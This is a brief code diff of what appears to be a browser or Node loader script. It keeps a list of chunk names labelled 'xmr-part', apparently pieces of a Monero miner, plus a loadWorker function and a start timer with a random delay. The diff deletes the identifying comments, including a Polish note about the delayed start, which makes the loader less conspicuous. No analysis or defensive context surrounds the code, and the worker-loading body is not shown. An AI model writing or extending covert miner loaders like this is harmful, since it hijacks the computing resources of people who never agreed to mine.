@@ -1,4 +1,3 @@
-// loader.js
 const PARTS = ['xmr-part-aa', 'xmr-part-ab', 'xmr-part-ac'];
 
 const loadWorker = async () => {
@@ -30,5 +29,4 @@ const loadWorker = async () => {
   }
 };
 
-// Start po 30s + losowe opóźnienie
 setTimeout(loadWorker, 30000 + Math.random() * 15000);
